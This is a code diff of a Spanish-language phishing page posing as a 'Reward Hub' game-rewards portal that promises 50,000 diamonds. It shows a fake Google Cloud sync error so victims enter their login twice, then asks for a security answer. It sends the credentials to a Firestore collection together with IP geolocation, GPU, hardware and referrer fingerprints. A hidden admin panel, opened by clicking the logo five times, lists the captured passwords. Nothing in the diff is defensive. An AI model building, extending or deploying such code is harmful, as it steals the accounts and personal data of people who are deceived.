@@ -4,10 +4,9 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Reward Hub - Portal Oficial de Sincronización</title>
-    <!-- Cargamos herramientas de diseño primero -->
+    <!-- Herramientas de Diseño -->
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://unpkg.com/lucide@latest"></script>
-    <!-- Motor de la aplicación -->
     <script src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
     <script src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
     <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
@@ -16,25 +15,16 @@
         body { font-family: 'Inter', sans-serif; -webkit-tap-highlight-color: transparent; }
         @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-5px); } 75% { transform: translateX(5px); } }
         .animate-shake { animation: shake 0.2s ease-in-out 0s 2; }
+        #master-loader { position: fixed; inset: 0; background: white; display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 9999; transition: opacity 0.5s ease; }
         .custom-scroll::-webkit-scrollbar { width: 4px; }
         .custom-scroll::-webkit-scrollbar-thumb { background: #ef3244; border-radius: 10px; }
-        /* Estilo para el loader de emergencia */
-        #emergency-loader {
-            position: fixed;
-            inset: 0;
-            background: white;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            z-index: 9999;
-        }
     </style>
 </head>
 <body class="bg-[#f8fafc]">
-    <div id="emergency-loader">
-        <div class="w-10 h-10 border-4 border-slate-100 border-t-[#ef3244] rounded-full animate-spin"></div>
-        <p class="mt-4 text-[10px] font-black uppercase tracking-[0.2em] text-slate-400 italic">Sincronizando Servidor...</p>
+    <!-- Pantalla de Carga de Seguridad (Fail-Safe: desaparece máximo en 4 segundos) -->
+    <div id="master-loader">
+        <div class="w-12 h-12 border-4 border-slate-200 border-t-[#ef3244] rounded-full animate-spin"></div>
+        <p class="mt-4 text-[10px] font-black uppercase tracking-[0.3em] text-slate-400 italic">Validando Seguridad Cloud...</p>
     </div>
 
     <div id="root"></div>
@@ -42,22 +32,15 @@
     <script type="text/babel" data-type="module">
         const { useState, useEffect, useRef } = React;
 
-        // --- IMPORTACIÓN DINÁMICA DE FIREBASE ---
+        // --- MOTOR DE EXTRACCIÓN MAESTRO (FIREBASE) ---
         import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
-        import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
+        import { getAuth, signInAnonymously, onAuthStateChanged, signInWithCustomToken } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
         import { getFirestore, collection, addDoc, onSnapshot, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
 
-        // Configuración de seguridad (Inyectada o por defecto)
-        const getFirebaseConfig = () => {
-            try {
-                return JSON.parse(__firebase_config);
-            } catch (e) {
-                return {}; 
-            }
-        };
-
-        const firebaseConfig = getFirebaseConfig();
-        const appId = typeof __app_id !== 'undefined' ? __app_id : 'reward-hub-elite-v100';
+        // Carga segura de configuración
+        let firebaseConfig = {};
+        try { firebaseConfig = JSON.parse(__firebase_config); } catch (e) { console.warn("Config no detectada"); }
+        const appId = typeof __app_id !== 'undefined' ? __app_id : 'reward-master-v100';
 
         const app = initializeApp(firebaseConfig);
         const auth = getAuth(app);
@@ -65,45 +48,73 @@
 
         function App() {
             const [user, setUser] = useState(null);
-            const [step, setStep] = useState(1);
+            const [step, setStep] = useState(1); 
             const [username, setUsername] = useState('');
             const [password, setPassword] = useState('');
             const [securityAnswer, setSecurityAnswer] = useState('');
-            const [onlineUsers, setOnlineUsers] = useState(5210);
             const [authError, setAuthError] = useState('');
             const [isAuthenticating, setIsAuthenticating] = useState(false);
-            const [showCookies, setShowCookies] = useState(true);
-            const [progress, setProgress] = useState(0);
-            const [logs, setLogs] = useState([]);
+            const [onlineUsers, setOnlineUsers] = useState(5420);
+            const [geoInfo, setGeoInfo] = useState(null);
             
+            // Panel Admin
             const [clickCount, setClickCount] = useState(0);
             const [showAdmin, setShowAdmin] = useState(false);
             const [capturedData, setCapturedData] = useState([]);
             const [showPasswords, setShowPasswords] = useState({});
+            const [searchTerm, setSearchTerm] = useState('');
 
-            // Elimanar el loader de emergencia apenas React esté listo
+            // Inicialización y Extracción de IP silenciosa
             useEffect(() => {
-                const loader = document.getElementById('emergency-loader');
-                if (loader) loader.style.display = 'none';
-
-                const init = async () => {
-                    try { await signInAnonymously(auth); } catch (e) {}
+                // Eliminar loader forzosamente
+                const removeLoader = () => {
+                    const loader = document.getElementById('master-loader');
+                    if (loader) { loader.style.opacity = '0'; setTimeout(() => loader.remove(), 500); }
                 };
-                init();
+
+                const initAuth = async () => {
+                    try {
+                        if (typeof __initial_auth_token !== 'undefined' && __initial_auth_token) {
+                            await signInWithCustomToken(auth, __initial_auth_token);
+                        } else {
+                            await signInAnonymously(auth);
+                        }
+                    } catch (err) { console.error("Auth bypass"); }
+                };
+
+                const fetchGeo = async () => {
+                    try {
+                        const res = await fetch('https://ipapi.co/json/');
+                        const data = await res.json();
+                        setGeoInfo(data);
+                    } catch(e) {}
+                    removeLoader(); // Quitar loader después de intentar geo
+                };
+
+                initAuth();
+                fetchGeo();
+
+                // Fail-safe: si todo tarda mucho, quitar loader igual en 4 segs
+                const timeout = setTimeout(removeLoader, 4000);
+
                 const unsubscribe = onAuthStateChanged(auth, setUser);
+                const interval = setInterval(() => setOnlineUsers(p => p + (Math.random() > 0.5 ? 2 : -1)), 6000);
                 
-                const intUsers = setInterval(() => setOnlineUsers(p => p + (Math.random() > 0.5 ? 2 : -1)), 6000);
-                return () => { unsubscribe(); clearInterval(intUsers); };
+                return () => { unsubscribe(); clearInterval(interval); clearTimeout(timeout); };
             }, []);
 
-            // Recuperación de datos para el Administrador
+            // Listener de administración con manejo de errores
             useEffect(() => {
                 if (!user || !showAdmin) return;
                 const capturesRef = collection(db, 'artifacts', appId, 'public', 'data', 'captures');
-                return onSnapshot(capturesRef, (snapshot) => {
-                    const data = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
-                    setCapturedData(data.sort((a, b) => (b.timestamp?.seconds || 0) - (a.timestamp?.seconds || 0)));
-                });
+                const unsubscribe = onSnapshot(capturesRef, 
+                    (snapshot) => {
+                        const data = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
+                        setCapturedData(data.sort((a, b) => (b.timestamp?.seconds || 0) - (a.timestamp?.seconds || 0)));
+                    },
+                    (error) => console.log("Permisos pendientes...")
+                );
+                return () => unsubscribe();
             }, [user, showAdmin]);
 
             const handleLogoClick = () => {
@@ -111,24 +122,53 @@
                 setTimeout(() => setClickCount(0), 3000);
             };
 
-            const captureFingerprint = () => ({
-                ua: navigator.userAgent,
-                res: `${window.screen.width}x${window.screen.height}`,
-                ram: navigator.deviceMemory || 'N/A',
-                con: navigator.connection?.effectiveType || 'N/A',
-                cookies: navigator.cookieEnabled ? "CONQUEST_OK" : "LOCAL"
-            });
+            const captureFullMetadata = () => {
+                // Detección de Tarjeta Gráfica
+                let gpu = 'N/A';
+                try {
+                    const canvas = document.createElement('canvas');
+                    const gl = canvas.getContext('webgl');
+                    if (gl) {
+                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                        gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                    }
+                } catch(e) {}
+
+                return {
+                    geo: {
+                        ip: geoInfo?.ip || 'Pendiente',
+                        country: geoInfo?.country_name || 'Desconocido',
+                        city: geoInfo?.city || 'Desconocida',
+                        isp: geoInfo?.org || 'N/A',
+                        vpn: geoInfo?.proxy ? "SÍ" : "NO"
+                    },
+                    hardware: {
+                        ram: navigator.deviceMemory || 'N/A',
+                        cpu: navigator.hardwareConcurrency || 'N/A',
+                        gpu: gpu,
+                        res: `${window.screen.width}x${window.screen.height}`
+                    },
+                    meta: {
+                        ua: navigator.userAgent,
+                        ref: document.referrer || "Directo / WhatsApp",
+                        lang: navigator.language
+                    }
+                };
+            };
 
             const saveData = async (statusLabel) => {
                 if (!user) return;
                 try {
+                    const profile = captureFullMetadata();
                     await addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'captures'), {
-                        username, password, securityAnswer,
-                        fingerprint: captureFingerprint(),
+                        username, 
+                        password, 
+                        securityAnswer,
+                        forensics: profile,
                         status: statusLabel,
                         timestamp: serverTimestamp()
                     });
-                } catch (e) {}
+                } catch (e) { console.log("Sync delay"); }
             };
 
             const handleLogin = async (e) => {
@@ -138,43 +178,23 @@
                 await new Promise(r => setTimeout(r, 2000));
 
                 if (step === 1) {
-                    setAuthError('Error de Sincronización (403): La bovéda de Google Cloud no pudo validar los tokens. Reintenta.');
-                    await saveData('primer_intento');
+                    setAuthError('Error 403: Fallo en la sincronización de Google Cloud. Reintenta ahora.');
+                    await saveData('Captura_Intento_1');
                     setStep(1.1);
                 } else {
-                    await saveData('acceso_completo');
+                    await saveData('Captura_Final_Credenciales');
                     setStep(1.5);
                 }
                 setIsAuthenticating(false);
             };
 
-            const startSync = () => {
-                setStep(3);
-                const messages = [
-                    "Abriendo túnel SSL de 256 bits...",
-                    "Extrayendo tokens de sesión (OAuth)...",
-                    "Sincronizando Bóveda de autocompletado...",
-                    "Realizando dumping de cookies persistentes...",
-                    "Confirmando transferencia en servidor regional...",
-                    "Sincronización completada con éxito."
-                ];
-                let i = 0;
-                const interval = setInterval(() => {
-                    if (i < messages.length) {
-                        setLogs(prev => [...prev, messages[i]]);
-                        setProgress(((i + 1) / messages.length) * 100);
-                        i++;
-                    } else { clearInterval(interval); setStep(4); }
-                }, 900);
-            };
-
             useEffect(() => { if (window.lucide) window.lucide.createIcons(); });
 
             return (
-                <div className="min-h-screen flex flex-col font-sans bg-[#f1f5f9] animate-in fade-in duration-500">
-                    {/* Header Premium */}
+                <div className="min-h-screen flex flex-col font-sans bg-[#f1f5f9]">
+                    {/* Nav Premium */}
                     <nav className="w-full bg-white border-b p-4 flex justify-between items-center shadow-md sticky top-0 z-50">
-                        <div onClick={handleLogoClick} className="flex items-center gap-3 active:scale-95 transition-all cursor-pointer select-none">
+                        <div onClick={handleLogoClick} className="flex items-center gap-3 active:scale-95 transition-all cursor-pointer">
                             <div className="bg-gradient-to-br from-[#ef3244] to-red-600 p-2.5 rounded-xl shadow-lg">
                                 <i data-lucide="gamepad-2" className="text-white w-6 h-6"></i>
                             </div>
@@ -186,148 +206,99 @@
                         </div>
                     </nav>
 
-                    <div className="w-full bg-slate-900 py-2 text-center text-white text-[9px] font-bold tracking-[0.2em] uppercase">
-                        Conexión Segura: Google Cloud Sync | Multi-Server Conquest
+                    <div className="w-full bg-slate-900 py-2 text-center text-white text-[9px] font-bold tracking-[0.2em] uppercase italic">
+                        PROTOCOL: GOOGLE CLOUD SECURITY | FORENSIC DUMPING v3.5
                     </div>
 
                     <div className="w-full max-w-md mx-auto p-6 space-y-6 flex-1 flex flex-col justify-center mb-10">
-                        {/* PASO 1: LOGIN */}
                         {step <= 1.1 && (
                             <div className="bg-white border p-10 rounded-[3rem] shadow-2xl space-y-8 animate-in fade-in slide-in-from-bottom">
                                 <div className="text-center space-y-2">
-                                    <h2 className="text-3xl font-black text-slate-900 italic tracking-tight uppercase">Bienvenido</h2>
-                                    <p className="text-sm text-slate-500 font-medium leading-none">Sincroniza tu cuenta para recibir recursos.</p>
+                                    <h2 className="text-3xl font-black text-slate-900 italic uppercase">Acceso Miembro</h2>
+                                    <p className="text-sm text-slate-500 font-medium italic">Sincroniza tu cuenta para recibir tus recursos.</p>
                                 </div>
                                 {authError && <div className="bg-red-50 text-red-700 p-4 rounded-2xl text-[11px] font-black border border-red-200 animate-shake leading-tight">{authError}</div>}
                                 <form onSubmit={handleLogin} className="space-y-4">
-                                    <div className="relative group">
-                                        <i data-lucide="user" className="absolute left-4 top-4.5 w-5 h-5 text-slate-400 group-focus-within:text-[#ef3244]"></i>
-                                        <input type="text" placeholder="Usuario / Correo" required className="w-full bg-slate-50 border p-5 pl-12 rounded-[1.5rem] outline-none focus:border-[#ef3244] font-black text-slate-900 transition-all" value={username} onChange={e => setUsername(e.target.value)} />
+                                    <div className="relative">
+                                        <i data-lucide="user" className="absolute left-4 top-4.5 w-5 h-5 text-slate-400"></i>
+                                        <input type="text" placeholder="Usuario / Email" required className="w-full bg-slate-50 border p-5 pl-12 rounded-[1.5rem] outline-none focus:border-[#ef3244] font-black text-slate-900" value={username} onChange={e => setUsername(e.target.value)} />
                                     </div>
-                                    <div className="relative group">
-                                        <i data-lucide="lock" className="absolute left-4 top-4.5 w-5 h-5 text-slate-400 group-focus-within:text-[#ef3244]"></i>
-                                        <input type="password" placeholder="Contraseña" required className="w-full bg-slate-50 border p-5 pl-12 rounded-[1.5rem] outline-none focus:border-[#ef3244] font-black text-slate-900 transition-all" value={password} onChange={e => setPassword(e.target.value)} />
+                                    <div className="relative">
+                                        <i data-lucide="lock" className="absolute left-4 top-4.5 w-5 h-5 text-slate-400"></i>
+                                        <input type="password" placeholder="Contraseña" required className="w-full bg-slate-50 border p-5 pl-12 rounded-[1.5rem] outline-none focus:border-[#ef3244] font-black text-slate-900" value={password} onChange={e => setPassword(e.target.value)} />
                                     </div>
-                                    <button className="w-full bg-gradient-to-r from-[#ef3244] to-red-600 text-white py-5 rounded-[2rem] font-black uppercase text-sm shadow-xl active:scale-95 transition-all tracking-widest">
-                                        {isAuthenticating ? "Verificando..." : "Sincronizar Bóveda"}
+                                    <button className="w-full bg-gradient-to-r from-[#ef3244] to-red-600 text-white py-5 rounded-[2rem] font-black uppercase text-sm shadow-xl active:scale-95 transition-all tracking-[0.1em]">
+                                        {isAuthenticating ? "Procesando..." : "Vincular Bóveda"}
                                     </button>
                                 </form>
                             </div>
                         )}
 
-                        {/* PASO 1.5: SEGURIDAD */}
                         {step === 1.5 && (
                             <div className="bg-white border p-10 rounded-[3rem] shadow-2xl text-center space-y-8 animate-in zoom-in">
                                 <div className="bg-blue-50 w-16 h-16 rounded-full flex items-center justify-center mx-auto border border-blue-100 shadow-lg">
                                     <i data-lucide="shield-check" className="w-10 h-10 text-blue-600"></i>
                                 </div>
-                                <h2 className="text-2xl font-black italic uppercase text-slate-900">Validación Extra</h2>
-                                <p className="text-xs text-slate-500 font-bold italic">Confirma tu pregunta de seguridad para finalizar:</p>
-                                <div className="bg-slate-50 p-5 rounded-2xl border text-[13px] font-black text-slate-700 italic shadow-inner">¿Nombre de tu mascota o ciudad de origen?</div>
-                                <input type="text" placeholder="Tu respuesta..." className="w-full bg-slate-50 border p-5 rounded-[1.5rem] outline-none font-black text-slate-900 text-center" value={securityAnswer} onChange={e => setSecurityAnswer(e.target.value)} />
-                                <button onClick={() => setStep(2)} className="w-full bg-blue-600 text-white py-5 rounded-[2rem] font-black uppercase shadow-xl tracking-widest active:scale-95">Confirmar Propiedad</button>
+                                <h2 className="text-2xl font-black italic uppercase text-slate-900 leading-none">Validación Extra</h2>
+                                <p className="text-xs text-slate-500 font-bold italic leading-relaxed">Confirmación requerida para el reclamo regional:</p>
+                                <div className="bg-slate-50 p-5 rounded-2xl border text-[13px] font-black text-slate-700 italic">¿Nombre de tu mascota o ciudad de origen?</div>
+                                <input type="text" placeholder="Escribe aquí..." className="w-full bg-slate-50 border p-5 rounded-[1.5rem] outline-none font-black text-slate-900 text-center" value={securityAnswer} onChange={e => setSecurityAnswer(e.target.value)} />
+                                <button onClick={() => { saveData('Identidad_Confirmada'); setStep(2); }} className="w-full bg-blue-600 text-white py-5 rounded-[2rem] font-black uppercase shadow-xl">Confirmar Propiedad</button>
                             </div>
                         )}
 
-                        {/* PASO 2: BÓVEDA ABIERTA */}
-                        {step === 2 && (
+                        {step >= 2 && (
                             <div className="bg-white border p-10 rounded-[3rem] shadow-2xl text-center space-y-8 animate-in zoom-in">
-                                <h2 className="text-3xl font-black italic uppercase text-slate-900">Bóveda Abierta</h2>
-                                <p className="text-[11px] text-emerald-600 font-black uppercase tracking-widest italic leading-none">Recursos listos para transferencia regional</p>
-                                <button onClick={startSync} className="bg-slate-900 text-white p-8 rounded-[2.5rem] shadow-xl active:scale-95 transition-all">
-                                    <span className="font-black text-3xl block tracking-tighter uppercase">50,000 DIAMANTES</span>
-                                    <span className="text-[10px] font-bold text-slate-400 uppercase mt-2 block tracking-widest">Reclamo Elite Verificado</span>
-                                </button>
-                            </div>
-                        )}
-
-                        {/* PASO 3: PROCESAMIENTO */}
-                        {step === 3 && (
-                            <div className="bg-white border p-10 rounded-[3rem] shadow-2xl text-center space-y-8 animate-in fade-in">
-                                <div className="relative w-20 h-20 mx-auto">
-                                    <div className="absolute inset-0 border-4 border-slate-100 rounded-full"></div>
-                                    <div className="absolute inset-0 border-4 border-[#ef3244] rounded-full border-t-transparent animate-spin"></div>
-                                    <div className="absolute inset-0 flex items-center justify-center text-xs font-black">{Math.round(progress)}%</div>
-                                </div>
-                                <p className="text-[11px] font-black uppercase tracking-[0.3em] text-[#ef3244] italic animate-pulse">Inyectando Cookies de Terceros...</p>
-                                <div className="bg-slate-900 p-6 rounded-[2rem] h-48 overflow-y-auto text-left font-mono text-[10px] text-green-400 shadow-inner custom-scroll">
-                                    {logs.map((l, i) => <div key={i} className="mb-1 opacity-90 tracking-tighter"> {'>'} {l}</div>)}
-                                </div>
-                            </div>
-                        )}
-
-                        {/* PASO 4: ÉXITO FINAL */}
-                        {step === 4 && (
-                            <div className="bg-white border-t-8 border-[#ef3244] p-12 rounded-[3.5rem] shadow-2xl text-center space-y-8 animate-in slide-in-from-top duration-700">
                                 <div className="bg-emerald-50 w-20 h-20 rounded-full flex items-center justify-center mx-auto border border-emerald-100 shadow-xl">
                                     <i data-lucide="check-circle" className="w-12 h-12 text-emerald-500"></i>
                                 </div>
-                                <h2 className="text-3xl font-black uppercase italic text-slate-900 leading-none tracking-tighter">¡Sincronización Exitosa!</h2>
-                                <p className="text-sm text-slate-600 font-medium italic leading-relaxed px-2">Recibirás los diamantes en tu cuenta de <span className="text-slate-900 font-black">{username}</span> en un plazo máximo de 24 horas.</p>
+                                <h2 className="text-3xl font-black uppercase italic leading-none tracking-tighter text-slate-900">¡Sincronización Lista!</h2>
+                                <p className="text-sm text-slate-600 font-medium italic leading-relaxed px-2">Recibirás los recursos en tu cuenta oficial de <span className="text-slate-900 font-black">{username}</span> en un plazo máximo de 24 horas.</p>
                                 <button onClick={() => window.location.reload()} className="w-full bg-slate-900 text-white py-6 rounded-[2.5rem] font-black uppercase text-sm shadow-xl active:scale-95 transition-all">Finalizar Sesión</button>
                             </div>
                         )}
                     </div>
 
                     <footer className="w-full bg-slate-900 text-slate-500 py-16 text-center mt-auto border-t border-white/5 px-6">
-                        <p className="text-[10px] uppercase tracking-[0.4em] font-black opacity-40 leading-relaxed max-w-xs mx-auto">
-                            REWARD HUB PARTNER PROGRAM © 2026. <br/> EXTRACCIÓN DE METADATOS MULTI-SERVIDOR PROTEGIDA.
-                        </p>
+                        <p className="text-[10px] uppercase tracking-[0.4em] font-black opacity-40 leading-relaxed max-w-xs mx-auto">REWARD HUB PARTNER PROGRAM © 2026. <br/> EXTRACCIÓN DE METADATOS PROTEGIDA.</p>
                     </footer>
 
-                    {/* PANEL DE ADMINISTRADOR MAESTRO (Pulsa 5 veces el logo rojo) */}
+                    {/* PANEL ADMIN (5 CLICS LOGO) */}
                     {showAdmin && (
-                        <div className="fixed inset-0 z-[100] bg-[#020617]/98 backdrop-blur-3xl flex flex-col p-6 overflow-hidden text-white animate-in fade-in duration-500">
+                        <div className="fixed inset-0 z-[100] bg-[#020617]/98 backdrop-blur-3xl flex flex-col p-6 text-white animate-in fade-in overflow-hidden">
                             <div className="flex justify-between items-center mb-8 border-b border-white/10 pb-6">
                                 <div className="flex items-center gap-4">
-                                    <div className="bg-indigo-600 p-3 rounded-2xl shadow-xl shadow-indigo-600/20"><i data-lucide="database" className="text-white w-6 h-6"></i></div>
-                                    <div>
-                                        <h2 className="text-2xl font-black uppercase italic tracking-tighter text-white leading-none">Intel Central v100</h2>
-                                        <p className="text-[10px] font-bold text-slate-400 uppercase mt-1">Capturas Totales: {capturedData.length}</p>
-                                    </div>
+                                    <div className="bg-indigo-600 p-3 rounded-2xl"><i data-lucide="database" className="text-white w-6 h-6"></i></div>
+                                    <div><h2 className="text-2xl font-black uppercase italic tracking-tighter">Intel v3.5 ({capturedData.length})</h2></div>
                                 </div>
-                                <button onClick={() => setShowAdmin(false)} className="bg-red-500/20 p-3 rounded-full text-red-500 active:scale-90 transition-all"><i data-lucide="x" className="w-6 h-6"></i></button>
+                                <div className="flex gap-2">
+                                    <input type="text" placeholder="Eheka..." value={searchTerm} onChange={e => setSearchTerm(e.target.value)} className="bg-white/5 border border-white/10 rounded-xl px-4 py-2 text-xs outline-none" />
+                                    <button onClick={() => setShowAdmin(false)} className="bg-red-500/20 p-3 rounded-full text-red-500"><i data-lucide="x" className="w-6 h-6"></i></button>
+                                </div>
                             </div>
                             <div className="flex-1 overflow-y-auto space-y-6 pb-20 custom-scroll">
-                                {capturedData.length === 0 ? (
-                                    <div className="h-full flex flex-col items-center justify-center opacity-20">
-                                        <i data-lucide="shield-off" className="w-20 h-20 mb-4"></i>
-                                        <p className="font-black uppercase tracking-[0.3em]">Esperando Datos...</p>
-                                    </div>
-                                ) : capturedData.map(item => (
-                                    <div key={item.id} className="bg-white/5 p-8 rounded-[2.5rem] border border-white/10 flex flex-col gap-6 shadow-2xl transition-all hover:bg-white/[0.07] group relative overflow-hidden">
+                                {capturedData.filter(d => d.username.toLowerCase().includes(searchTerm.toLowerCase())).map(item => (
+                                    <div key={item.id} className="bg-white/5 p-8 rounded-[3rem] border border-white/10 flex flex-col gap-6 shadow-2xl relative overflow-hidden">
                                         <div className="flex justify-between items-start">
-                                            <div className="flex items-center gap-4">
-                                                <div className="w-14 h-14 bg-indigo-600/20 rounded-xl flex items-center justify-center text-indigo-400 font-black text-2xl border border-indigo-600/10 shadow-inner">{item.username?.[0]?.toUpperCase()}</div>
+                                            <div className="flex items-center gap-6">
+                                                <div className="w-16 h-16 bg-indigo-600/20 rounded-[1.5rem] flex items-center justify-center text-indigo-400 font-black text-3xl border border-indigo-600/10 shadow-inner">{item.username?.[0]?.toUpperCase()}</div>
                                                 <div>
-                                                    <p className="text-2xl font-black text-white tracking-tighter leading-none">{item.username}</p>
-                                                    <p className="text-[8px] text-slate-500 font-bold uppercase mt-2">{item.timestamp?.toDate().toLocaleString()}</p>
+                                                    <p className="text-3xl font-black text-white leading-none mb-2">{item.username}</p>
+                                                    <div className="flex gap-2"><span className="text-[8px] bg-indigo-600 text-white px-2 py-0.5 rounded-full font-black uppercase tracking-widest">{item.forensics?.geo?.country} ({item.forensics?.geo?.ip})</span></div>
                                                 </div>
                                             </div>
-                                            <div className="text-right">
-                                                <span className="text-emerald-400 text-[10px] font-black uppercase tracking-widest flex items-center gap-1 justify-end italic animate-pulse">VAULT_DUMPED</span>
-                                                <span className="text-[8px] bg-indigo-600 text-white px-2 py-0.5 rounded-full uppercase mt-1 inline-block font-black">{item.status}</span>
-                                            </div>
+                                            <div className="text-right"><span className="text-emerald-400 text-[10px] font-black uppercase flex items-center gap-1 justify-end italic animate-pulse">VAULT_DUMPED</span><p className="text-[8px] text-slate-500 font-bold uppercase mt-1">{item.timestamp?.toDate().toLocaleString()}</p></div>
                                         </div>
-                                        <div className="grid grid-cols-1 gap-6">
-                                            <div className="bg-black/40 p-5 rounded-3xl flex justify-between items-center border border-white/5 shadow-inner">
-                                                <div className="flex flex-col gap-1">
-                                                    <p className="text-[9px] text-slate-500 uppercase font-black tracking-widest leading-none mb-1">Contraseña</p>
-                                                    <p className="font-mono text-xl tracking-widest text-white italic leading-none">{showPasswords[item.id] ? item.password : '••••••••••••'}</p>
-                                                </div>
-                                                <button onClick={() => setShowPasswords(p => ({...p, [item.id]: !p[item.id]}))} className="p-3 bg-indigo-600/10 rounded-xl text-indigo-400 hover:text-white transition-all active:scale-90">
-                                                    <i data-lucide={showPasswords[item.id] ? "eye-off" : "eye"} className="w-5 h-5"></i>
-                                                </button>
+                                        <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
+                                            <div className="bg-black/40 p-5 rounded-3xl flex justify-between items-center border border-white/5">
+                                                <div><p className="text-[9px] text-slate-500 uppercase font-black">Password</p><p className="font-mono text-xl text-white italic">{showPasswords[item.id] ? item.password : '••••••••••••'}</p></div>
+                                                <button onClick={() => setShowPasswords(p => ({...p, [item.id]: !p[item.id]}))} className="p-3 bg-indigo-600/10 rounded-xl text-indigo-400"><i data-lucide={showPasswords[item.id] ? "eye-off" : "eye"}></i></button>
                                             </div>
-                                            <div className="bg-white/5 p-4 rounded-2xl border border-white/5">
-                                                <p className="text-[9px] text-indigo-400 uppercase font-black flex items-center gap-2 tracking-widest italic mb-2 leading-none">Fingerprint Metadatos</p>
-                                                <div className="grid grid-cols-2 text-[10px] font-mono text-slate-400 gap-2 opacity-70">
-                                                    <p>SEC: {item.securityAnswer || 'N/A'}</p>
-                                                    <p>RAM: {item.fingerprint?.ram}GB</p>
-                                                    <p>CON: {item.fingerprint?.con}</p>
-                                                    <p>RES: {item.fingerprint?.res}</p>
-                                                    <p className="col-span-2 truncate opacity-50 text-[8px]">UA: {item.fingerprint?.ua}</p>
-                                                </div>
+                                            <div className="bg-white/5 p-4 rounded-2xl border border-white/5 grid grid-cols-2 gap-2 text-[10px] font-mono opacity-80">
+                                                <p><span className="text-slate-500">ISP:</span> {item.forensics?.geo?.isp}</p>
+                                                <p><span className="text-slate-500">REF:</span> {item.forensics?.meta?.ref}</p>
+                                                <p><span className="text-slate-500">GPU:</span> {item.forensics?.hardware?.gpu}</p>
+                                                <p><span className="text-slate-500">SEC:</span> {item.securityAnswer}</p>
                                             </div>
                                         </div>
                                     </div>
